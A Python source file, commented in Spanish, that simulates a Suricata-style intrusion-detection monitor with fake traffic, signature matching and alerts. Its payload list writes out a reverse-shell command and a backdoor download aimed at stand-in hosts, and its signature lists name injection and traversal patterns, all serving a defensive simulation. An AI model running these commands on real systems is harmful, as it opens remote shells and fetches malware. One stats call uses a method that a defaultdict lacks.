import asyncio
import json
import random
from datetime import datetime, timedelta
from typing import Dict, List
from loguru import logger
import psutil
import socket
from collections import defaultdict

class RealTimeMonitor:
    """Servicio de monitoreo en tiempo real simulando Suricata/IDS"""
    
    def __init__(self):
        self.active_connections = []
        self.attack_patterns = {
            'SQL_INJECTION': ['union select', 'or 1=1', "'; drop table", 'exec xp_'],
            'XSS': ['<script>', 'javascript:', 'onload=', 'alert('],
            'DIRECTORY_TRAVERSAL': ['../../../', '..\\..\\', '/etc/passwd', 'boot.ini'],
            'COMMAND_INJECTION': ['&& cat', '| ls', '; wget', '`whoami`'],
            'BRUTE_FORCE': [],  # Detectado por intentos repetidos
            'DDoS': [],  # Detectado por volumen de tráfico
            'PORT_SCAN': [],  # Detectado por escaneo de puertos
        }
        
        self.alerts = []
        self.traffic_stats = {
            'total_requests': 0,
            'blocked_requests': 0,
            'suspicious_requests': 0,
            'unique_ips': set(),
            'top_countries': defaultdict(int),
            'attack_types': defaultdict(int)
        }
        
        # Simulación de tráfico
        self.simulated_ips = self._generate_simulated_ips()
        
    def _generate_simulated_ips(self) -> List[Dict]:
        """Generar IPs simuladas para el tráfico"""
        countries = ['US', 'CN', 'RU', 'BR', 'IN', 'DE', 'FR', 'GB', 'JP', 'CA']
        cities = {
            'US': ['New York', 'Los Angeles', 'Chicago'],
            'CN': ['Beijing', 'Shanghai', 'Shenzhen'],
            'RU': ['Moscow', 'St. Petersburg', 'Novosibirsk'],
            'BR': ['São Paulo', 'Rio de Janeiro', 'Brasília'],
            'IN': ['Mumbai', 'Delhi', 'Bangalore'],
            'DE': ['Berlin', 'Munich', 'Hamburg'],
            'FR': ['Paris', 'Lyon', 'Marseille'],
            'GB': ['London', 'Manchester', 'Birmingham'],
            'JP': ['Tokyo', 'Osaka', 'Kyoto'],
            'CA': ['Toronto', 'Vancouver', 'Montreal']
        }
        
        ips = []
        for _ in range(100):
            country = random.choice(countries)
            city = random.choice(cities[country])
            ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            
            ips.append({
                'ip': ip,
                'country': country,
                'city': city,
                'is_malicious': random.random() < 0.15,  # 15% de IPs maliciosas
                'reputation_score': random.randint(20, 100)
            })
        
        return ips
    
    async def start_monitoring(self):
        """Iniciar monitoreo en tiempo real"""
        logger.info("Iniciando monitoreo en tiempo real...")
        
        # Ejecutar tareas de monitoreo en paralelo
        await asyncio.gather(
            self._monitor_network_traffic(),
            self._monitor_system_resources(),
            self._detect_anomalies(),
            self._generate_threat_intel()
        )
    
    async def _monitor_network_traffic(self):
        """Monitorear tráfico de red simulado"""
        while True:
            # Simular conexiones entrantes
            for _ in range(random.randint(5, 25)):
                connection = self._generate_connection()
                self.active_connections.append(connection)
                
                # Analizar cada conexión en busca de ataques
                await self._analyze_connection(connection)
                
                # Actualizar estadísticas
                self._update_traffic_stats(connection)
            
            # Limpiar conexiones antiguas
            self._cleanup_old_connections()
            
            await asyncio.sleep(2)  # Actualizar cada 2 segundos
    
    def _generate_connection(self) -> Dict:
        """Generar conexión simulada"""
        source_ip_info = random.choice(self.simulated_ips)
        
        # Tipos de peticiones HTTP comunes
        methods = ['GET', 'POST', 'PUT', 'DELETE', 'HEAD', 'OPTIONS']
        paths = [
            '/', '/admin', '/login', '/api/users', '/wp-admin',
            '/phpmyadmin', '/config', '/backup', '/test',
            '/uploads', '/images', '/css', '/js'
        ]
        
        # User agents comunes y algunos sospechosos
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'curl/7.68.0',
            'sqlmap/1.4.7',  # Sospechoso
            'Nikto/2.1.6',   # Sospechoso
            'python-requests/2.25.1'
        ]
        
        connection = {
            'timestamp': datetime.now().isoformat(),
            'source_ip': source_ip_info['ip'],
            'source_country': source_ip_info['country'],
            'source_city': source_ip_info['city'],
            'is_malicious_ip': source_ip_info['is_malicious'],
            'destination_port': random.choice([80, 443, 8080, 3000]),
            'method': random.choice(methods),
            'path': random.choice(paths),
            'user_agent': random.choice(user_agents),
            'payload_size': random.randint(100, 10000),
            'response_code': random.choice([200, 301, 404, 403, 500, 502]),
            'request_id': f"req_{random.randint(100000, 999999)}"
        }
        
        # Añadir payload sospechoso ocasionalmente
        if random.random() < 0.2:  # 20% de chance
            connection['payload'] = self._generate_suspicious_payload()
        
        return connection
    
    def _generate_suspicious_payload(self) -> str:
        """Generar payload sospechoso para simulación"""
        suspicious_payloads = [
            "'; DROP TABLE users; --",
            "<script>alert('XSS')</script>",
            "../../../etc/passwd",
            "admin' OR '1'='1",
            "<iframe src='javascript:alert(1)'></iframe>",
            "nc -e /bin/bash attacker.com 4444",
            "wget http://malware.com/backdoor.sh",
            "SELECT * FROM information_schema.tables"
        ]
        
        return random.choice(suspicious_payloads)
    
    async def _analyze_connection(self, connection: Dict):
        """Analizar conexión en busca de ataques"""
        alerts = []
        
        # Verificar IP maliciosa conocida
        if connection['is_malicious_ip']:
            alerts.append({
                'type': 'MALICIOUS_IP',
                'severity': 'HIGH',
                'message': f"Conexión desde IP maliciosa conocida: {connection['source_ip']}",
                'source_ip': connection['source_ip'],
                'timestamp': connection['timestamp']
            })
        
        # Verificar user agents sospechosos
        suspicious_agents = ['sqlmap', 'nikto', 'nmap', 'masscan']
        if any(agent in connection['user_agent'].lower() for agent in suspicious_agents):
            alerts.append({
                'type': 'SUSPICIOUS_USER_AGENT',
                'severity': 'MEDIUM',
                'message': f"User agent sospechoso detectado: {connection['user_agent']}",
                'source_ip': connection['source_ip'],
                'timestamp': connection['timestamp']
            })
        
        # Verificar payloads maliciosos
        if 'payload' in connection:
            for attack_type, patterns in self.attack_patterns.items():
                for pattern in patterns:
                    if pattern.lower() in connection['payload'].lower():
                        alerts.append({
                            'type': attack_type,
                            'severity': 'CRITICAL',
                            'message': f"{attack_type} detectado: {pattern}",
                            'source_ip': connection['source_ip'],
                            'payload': connection['payload'],
                            'timestamp': connection['timestamp']
                        })
        
        # Verificar intentos de fuerza bruta
        if self._detect_brute_force(connection['source_ip']):
            alerts.append({
                'type': 'BRUTE_FORCE',
                'severity': 'HIGH',
                'message': f"Intento de fuerza bruta detectado desde {connection['source_ip']}",
                'source_ip': connection['source_ip'],
                'timestamp': connection['timestamp']
            })
        
        # Guardar alertas
        for alert in alerts:
            self.alerts.append(alert)
            logger.warning(f"ALERTA: {alert['type']} - {alert['message']}")
    
    def _detect_brute_force(self, ip: str) -> bool:
        """Detectar intentos de fuerza bruta"""
        recent_connections = [
            conn for conn in self.active_connections[-100:]
            if conn['source_ip'] == ip and 
            (datetime.now() - datetime.fromisoformat(conn['timestamp'])).seconds < 60
        ]
        
        return len(recent_connections) > 10  # Más de 10 conexiones en 1 minuto
    
    def _update_traffic_stats(self, connection: Dict):
        """Actualizar estadísticas de tráfico"""
        self.traffic_stats['total_requests'] += 1
        self.traffic_stats['unique_ips'].add(connection['source_ip'])
        self.traffic_stats['top_countries'][connection['source_country']] += 1
        
        if connection['is_malicious_ip'] or 'payload' in connection:
            self.traffic_stats['suspicious_requests'] += 1
    
    def _cleanup_old_connections(self):
        """Limpiar conexiones antiguas (más de 5 minutos)"""
        cutoff_time = datetime.now() - timedelta(minutes=5)
        self.active_connections = [
            conn for conn in self.active_connections
            if datetime.fromisoformat(conn['timestamp']) > cutoff_time
        ]
    
    async def _monitor_system_resources(self):
        """Monitorear recursos del sistema"""
        while True:
            try:
                # Obtener métricas del sistema
                cpu_percent = psutil.cpu_percent(interval=1)
                memory = psutil.virtual_memory()
                disk = psutil.disk_usage('/')
                
                # Verificar umbrales críticos
                if cpu_percent > 90:
                    self.alerts.append({
                        'type': 'HIGH_CPU_USAGE',
                        'severity': 'WARNING',
                        'message': f"Uso alto de CPU: {cpu_percent}%",
                        'timestamp': datetime.now().isoformat()
                    })
                
                if memory.percent > 90:
                    self.alerts.append({
                        'type': 'HIGH_MEMORY_USAGE',
                        'severity': 'WARNING',
                        'message': f"Uso alto de memoria: {memory.percent}%",
                        'timestamp': datetime.now().isoformat()
                    })
                
            except Exception as e:
                logger.error(f"Error monitoreando recursos: {e}")
            
            await asyncio.sleep(30)  # Verificar cada 30 segundos
    
    async def _detect_anomalies(self):
        """Detectar anomalías en el tráfico"""
        while True:
            try:
                # Analizar patrones de tráfico
                recent_traffic = self.active_connections[-100:]
                
                if len(recent_traffic) > 50:  # Tráfico inusualmente alto
                    unique_ips = len(set(conn['source_ip'] for conn in recent_traffic))
                    
                    if unique_ips < 5:  # Pocas IPs generando mucho tráfico
                        self.alerts.append({
                            'type': 'POTENTIAL_DDOS',
                            'severity': 'CRITICAL',
                            'message': f"Posible ataque DDoS: {len(recent_traffic)} requests desde {unique_ips} IPs",
                            'timestamp': datetime.now().isoformat()
                        })
                
            except Exception as e:
                logger.error(f"Error detectando anomalías: {e}")
            
            await asyncio.sleep(60)  # Verificar cada minuto
    
    async def _generate_threat_intel(self):
        """Generar inteligencia de amenazas"""
        while True:
            try:
                # Simular nuevas amenazas detectadas
                if random.random() < 0.1:  # 10% de probabilidad
                    threat_types = [
                        'Nuevo malware detectado',
                        'Campaña de phishing activa',
                        'Botnet C&C identificado',
                        'Vulnerabilidad 0-day reportada'
                    ]
                    
                    threat = {
                        'type': 'THREAT_INTEL',
                        'severity': random.choice(['LOW', 'MEDIUM', 'HIGH', 'CRITICAL']),
                        'message': random.choice(threat_types),
                        'timestamp': datetime.now().isoformat(),
                        'source': 'Threat Intelligence Feed'
                    }
                    
                    self.alerts.append(threat)
                
            except Exception as e:
                logger.error(f"Error generando threat intel: {e}")
            
            await asyncio.sleep(300)  # Cada 5 minutos
    
    def get_realtime_stats(self) -> Dict:
        """Obtener estadísticas en tiempo real"""
        recent_alerts = [
            alert for alert in self.alerts[-50:]
            if (datetime.now() - datetime.fromisoformat(alert['timestamp'])).seconds < 3600
        ]
        
        return {
            'current_connections': len(self.active_connections),
            'total_requests': self.traffic_stats['total_requests'],
            'unique_ips': len(self.traffic_stats['unique_ips']),
            'suspicious_requests': self.traffic_stats['suspicious_requests'],
            'recent_alerts': len(recent_alerts),
            'top_countries': dict(list(self.traffic_stats['top_countries'].most_common(5))),
            'alerts_by_severity': self._group_alerts_by_severity(recent_alerts),
            'active_threats': self._get_active_threats()
        }
    
    def _group_alerts_by_severity(self, alerts: List[Dict]) -> Dict:
        """Agrupar alertas por severidad"""
        severity_counts = defaultdict(int)
        for alert in alerts:
            severity_counts[alert['severity']] += 1
        return dict(severity_counts)
    
    def _get_active_threats(self) -> List[Dict]:
        """Obtener amenazas activas"""
        return self.alerts[-10:]  # Últimas 10 amenazas
    
    def get_attack_timeline(self, hours: int = 24) -> List[Dict]:
        """Obtener timeline de ataques"""
        cutoff_time = datetime.now() - timedelta(hours=hours)
        
        timeline_alerts = [
            alert for alert in self.alerts
            if datetime.fromisoformat(alert['timestamp']) > cutoff_time
        ]
        
        return sorted(timeline_alerts, key=lambda x: x['timestamp'], reverse=True)
    
    def get_geographic_data(self) -> Dict:
        """Obtener datos geográficos de ataques"""
        country_attacks = defaultdict(int)
        
        for alert in self.alerts[-100:]:
            if 'source_ip' in alert:
                # Buscar el país de la IP
                for ip_info in self.simulated_ips:
                    if ip_info['ip'] == alert['source_ip']:
                        country_attacks[ip_info['country']] += 1
                        break
        
        return dict(country_attacks)

# Instancia global del monitor
realtime_monitor = RealTimeMonitor()

